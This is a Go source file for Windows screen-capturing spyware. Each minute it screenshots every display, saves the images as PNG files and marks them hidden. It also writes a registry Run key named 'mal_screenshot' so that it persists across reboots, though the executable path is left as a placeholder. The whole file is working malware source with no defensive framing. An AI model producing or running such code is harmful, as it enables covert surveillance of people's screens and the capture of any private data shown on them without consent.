package main

import (
	"fmt"
	"image/png"
	"log"
	"os"
	"runtime"
	"syscall"
	"time"

	"github.com/kbinani/screenshot"
	"golang.org/x/sys/windows/registry"
)

func main() {
	// Snaps a screenshot every minute
	go StartOnBoot()

	for {
		time.Sleep(time.Minute * 1)
		go GrabScreenshot()
	}

}

//GrabScreenshot function to snap a screenshot
func GrabScreenshot() {

	// Captures display monitors
	numDisp := screenshot.NumActiveDisplays()
	t := time.Now()

	for count := 0; count < numDisp; count++ {
		bounds := screenshot.GetDisplayBounds(count)

		image, error := screenshot.CaptureRect(bounds)
		if error != nil {
			// returns the error if there is an error
			panic(error)
		}

		fileName := fmt.Sprintf("%d_%d%d%d%d%d%d.png", count, t.Year(), t.Month(), t.Day(), t.Hour(), t.Minute(), t.Second())

		// Create the file
		file, _ := os.OpenFile(fileName, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)

		defer file.Close()
		png.Encode(file, image)

		fmt.Printf("#%d : %v \"%s\"\n", count, bounds, fileName)

		HideFile(fileName)
	}

}

// HideFile - hides the file
func HideFile(filename string) error {

	os := runtime.GOOS

	// Detect Windows OS
	if os == "windows" {
		filenameW, error := syscall.UTF16PtrFromString(filename)
		if error != nil {
			panic(error)
		}
		error = syscall.SetFileAttributes(filenameW, syscall.FILE_ATTRIBUTE_HIDDEN)
		if error != nil {
			return error
		}
	}
	return nil
}

// StartOnBoot autorun on boot
func StartOnBoot() {

	k, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		log.Fatal(err)
	}
	if err := k.SetStringValue("mal_screenshot", "<Executable file path>"); err != nil {
		log.Fatal(err)
	}
	if err := k.Close(); err != nil {
		log.Fatal(err)
	}

}
